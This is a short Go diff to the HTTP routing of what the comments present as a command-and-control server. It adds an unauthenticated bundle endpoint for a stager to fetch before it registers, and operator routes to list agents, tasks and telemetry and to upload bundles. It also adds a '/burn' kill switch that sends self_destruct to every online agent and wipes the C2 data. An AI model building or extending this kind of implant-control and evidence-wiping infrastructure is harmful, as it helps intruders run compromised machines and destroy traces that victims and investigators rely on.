@@ -31,6 +31,7 @@ func New(
 	agentGroup.Use(middleware.RateLimiter(redisClient, 60, time.Minute))
 	{
 		agentGroup.POST("/register", agentHandler.Register)
+		agentGroup.GET("/bundle", agentHandler.ServeBundle) // unauthenticated — stager calls before registering
 
 		authed := agentGroup.Group("")
 		authed.Use(middleware.AgentAuth(agentRepo))
@@ -52,9 +53,20 @@ func New(
 		opAuthed := op.Group("")
 		opAuthed.Use(middleware.ValidateOperatorJWT(jwtSecret))
 		{
-			opAuthed.POST("/payload/upload", payloadHandler.Upload)
-			opAuthed.GET("/payload/status", payloadHandler.Status)
+			opAuthed.POST("/payload/upload",  payloadHandler.Upload)
+			opAuthed.GET("/payload/status",   payloadHandler.Status)
 			opAuthed.POST("/payload/webhook", payloadHandler.Webhook)
+
+			// Agent / task / telemetry views for the operator CLI.
+			opAuthed.GET("/agents",     agentHandler.ListAgents)
+			opAuthed.GET("/tasks",      agentHandler.ListTasks)
+			opAuthed.GET("/telemetry",  agentHandler.ListTelemetry)
+
+			// Bundle management.
+			opAuthed.POST("/bundle/upload", agentHandler.BundleUpload)
+
+			// Kill switch — push self_destruct to all online agents + wipe C2 data.
+			opAuthed.POST("/burn", agentHandler.Burn)
 		}
 	}
 
